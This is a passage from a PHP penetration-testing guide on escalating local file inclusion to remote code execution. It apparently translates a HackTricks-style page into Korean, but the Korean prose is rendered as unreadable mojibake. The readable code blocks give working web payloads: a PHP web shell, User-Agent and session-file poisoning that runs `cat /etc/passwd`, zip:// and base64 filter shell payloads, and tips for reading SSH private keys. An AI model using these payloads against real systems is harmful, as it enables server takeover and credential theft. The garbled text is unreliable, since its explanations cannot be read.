2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ $PIDëŠ” í”„ë¡œì„¸ìŠ¤ì˜ PIDì´ë©° (ë¬´ì°¨ë³„ ëŒ€ì…ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŒ), $FDëŠ” íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°ì…ë‹ˆë‹¤ (ì´ê²ƒë„ ë¬´ì°¨ë³„ ëŒ€ì…ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŒ).

### /proc/self/environì„ í†µí•´

ë¡œê·¸ íŒŒì¼ì²˜ëŸ¼ User-Agentì— í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ë©´ /proc/self/environ íŒŒì¼ ë‚´ì— ë°˜ì˜ë©ë‹ˆë‹¤.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### ì—…ë¡œë“œë¥¼ í†µí•´

íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´, ì‰˜ í˜ì´ë¡œë“œë¥¼ ì‚½ì…í•˜ì‹­ì‹œì˜¤ (ì˜ˆ : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
íŒŒì¼ì„ ê°€ë…ì„± ìˆê²Œ ìœ ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ì‚¬ì§„/ë¬¸ì„œ/PDFì˜ ë©”íƒ€ë°ì´í„°ì— ì£¼ì…í•˜ëŠ” ê²ƒì´ ê°€ì¥ ì¢‹ìŠµë‹ˆë‹¤.

### Zip íŒŒì¼ ì—…ë¡œë“œë¥¼ í†µí•´

PHP ì‰˜ì„ ì••ì¶•í•œ ZIP íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP ì„¸ì…˜ì„ í†µí•´

ì›¹ì‚¬ì´íŠ¸ê°€ PHP ì„¸ì…˜(PHPSESSID)ì„ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPì—ì„œ ì´ëŸ¬í•œ ì„¸ì…˜ì€ _/var/lib/php5/sess\\_\[PHPSESSID]\_ íŒŒì¼ì— ì €ì¥ë©ë‹ˆë‹¤.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
ì¿ í‚¤ë¥¼ `<?php system('cat /etc/passwd');?>`ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP ì„¸ì…˜ íŒŒì¼ì„ í¬í•¨í•˜ê¸° ìœ„í•´ LFIë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSHë¥¼ í†µí•´

ë§Œì•½ sshê°€ í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´ ì‚¬ìš© ì¤‘ì¸ ì‚¬ìš©ìë¥¼ í™•ì¸í•˜ì„¸ìš” (/proc/self/status ë° /etc/passwd) ê·¸ë¦¬ê³  **\<HOME>/.ssh/id\_rsa**ì— ì•¡ì„¸ìŠ¤ë¥¼ ì‹œë„í•˜ì„¸ìš”.

### **vsftpd** _ë¡œê·¸_ë¥¼ í†µí•´

FTP ì„œë²„ vsftpdì˜ ë¡œê·¸ëŠ” _**/var/log/vsftpd.log**_ì— ìœ„ì¹˜í•©ë‹ˆë‹¤. ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI) ì·¨ì•½ì ì´ ì¡´ì¬í•˜ê³  ë…¸ì¶œëœ vsftpd ì„œë²„ì— ì•¡ì„¸ìŠ¤ê°€ ê°€ëŠ¥í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ê³ ë ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ë¡œê·¸ì¸ í”„ë¡œì„¸ìŠ¤ ì¤‘ì— ì‚¬ìš©ì ì´ë¦„ í•„ë“œì— PHP í˜ì´ë¡œë“œë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.
2. ì‚½ì… í›„, LFIë¥¼ ì‚¬ìš©í•˜ì—¬ _**/var/log/vsftpd.log**_ì—ì„œ ì„œë²„ ë¡œê·¸ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤.

### php base64 í•„í„°ë¥¼ í†µí•´ (base64 ì‚¬ìš©)

[ì´](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) ê¸°ì‚¬ì—ì„œ ë³´ì—¬ì§„ëŒ€ë¡œ, PHP base64 í•„í„°ëŠ” ë¹„ë² ì´ìŠ¤64ë¥¼ ë¬´ì‹œí•©ë‹ˆë‹¤. ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ í™•ì¥ì í™•ì¸ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: base64ë¡œ ëë‚˜ëŠ” ".php"ë¥¼ ì œê³µí•˜ë©´, "."ì„ ë¬´ì‹œí•˜ê³  "php"ë¥¼ base64ì— ì¶”ê°€í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ì˜ˆì‹œ í˜ì´ë¡œë“œì…ë‹ˆë‹¤:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### PHP í•„í„°ë¥¼ í†µí•´ (íŒŒì¼ í•„ìš” ì—†ìŒ)

ì´ [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)ì€ **php í•„í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ì½˜í…ì¸ ë¥¼ ìƒì„±**í•˜ì—¬ ì¶œë ¥í•  ìˆ˜ ìˆë‹¤ê³  ì„¤ëª…í•©ë‹ˆë‹¤. ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **íŒŒì¼ì— ì“°ì§€ ì•Šê³ ë„** includeë¥¼ ìœ„í•œ **ì„ì˜ì˜ php ì½”ë“œë¥¼ ìƒì„±**í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### ì„¸ê·¸ë©˜í…Œì´ì…˜ í´íŠ¸ë¥¼ í†µí•´

`/tmp`ì— **ì„ì‹œë¡œ ì €ì¥**ë  íŒŒì¼ì„ **ì—…ë¡œë“œ**í•œ ë‹¤ìŒ **ë™ì¼í•œ ìš”ì²­**ì—ì„œ **ì„¸ê·¸ë©˜í…Œì´ì…˜ í´íŠ¸**ë¥¼ íŠ¸ë¦¬ê±°í•˜ë©´ **ì„ì‹œ íŒŒì¼ì´ ì‚­ì œë˜ì§€ ì•Šê³ ** í•´ë‹¹ íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx ì„ì‹œ íŒŒì¼ ì €ì¥ì†Œë¥¼ í†µí•´

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í–ˆê³  **Nginx**ê°€ PHP ì•ì—ì„œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ ë‹¤ìŒ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESSë¥¼ í†µí•´

**ì„¸ì…˜**ì´ ì—†ê³  `session.auto_start`ê°€ `Off`ì´ì–´ë„ **ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í–ˆë‹¤ë©´ **`PHP_SESSION_UPLOAD_PROGRESS`**ë¥¼ **multipart POST** ë°ì´í„°ì— ì œê³µí•˜ë©´ PHPê°€ **ì„¸ì…˜ì„ í™œì„±í™”**í•©ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windowsì—ì„œì˜ ì„ì‹œ íŒŒì¼ ì—…ë¡œë“œë¥¼ í†µí•´

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í–ˆê³  ì„œë²„ê°€ **Windows**ì—ì„œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on)ë¥¼ í†µí•´

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í–ˆê³  íŒŒì¼ì´ **phpinfo()ë¥¼ ë…¸ì¶œ**í•˜ë©° file\_uploads = onì¸ ê²½ìš° RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + ê²½ë¡œ ê³µê°œë¥¼ í†µí•´

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í–ˆê³  **ì„ì‹œ íŒŒì¼ì˜ ê²½ë¡œë¥¼ ìœ ì¶œ**í•  ìˆ˜ ìˆì§€ë§Œ **ì„œë²„**ê°€ **í¬í•¨í•  íŒŒì¼ì— PHP í‘œì‹œê°€ ìˆëŠ”ì§€ í™•ì¸**í•˜ëŠ” ê²½ìš°, ì´ **ë ˆì´ìŠ¤ ì»¨ë””ì…˜**ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ í™•ì¸ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### ì˜ì›í•œ ëŒ€ê¸° + ë¸Œë£¨íŠ¸í¬ìŠ¤ë¥¼ í†µí•´

LFIë¥¼ ì•…ìš©í•˜ì—¬ **ì„ì‹œ íŒŒì¼ì„ ì—…ë¡œë“œ**í•˜ê³  ì„œë²„ê°€ **PHP ì‹¤í–‰ì„ ì¤‘ë‹¨**ì‹œí‚¤ë©´ **ì‹œê°„ì´ ì§€ë‚˜ë„ë¡ íŒŒì¼ ì´ë¦„ì„ ë¸Œë£¨íŠ¸ í¬ìŠ¤**í•˜ì—¬ ì„ì‹œ íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### ì¹˜ëª…ì  ì˜¤ë¥˜ë¡œ

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` ì¤‘ í•˜ë‚˜ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. (ë™ì¼í•œ ê²ƒì„ 2ë²ˆ í¬í•¨í•´ì•¼ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤).

**ì´ê²ƒì´ ì–´ë–»ê²Œ ìœ ìš©í•œì§€ëŠ” ëª¨ë¥´ê² ì§€ë§Œ ê·¸ëŸ´ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.**\
_ì‹¬ì§€ì–´ PHP ì¹˜ëª…ì  ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œì¼œë„ PHP ì„ì‹œ íŒŒì¼ì´ ì—…ë¡œë“œëœ íŒŒì¼ì€ ì‚­ì œë©ë‹ˆë‹¤._
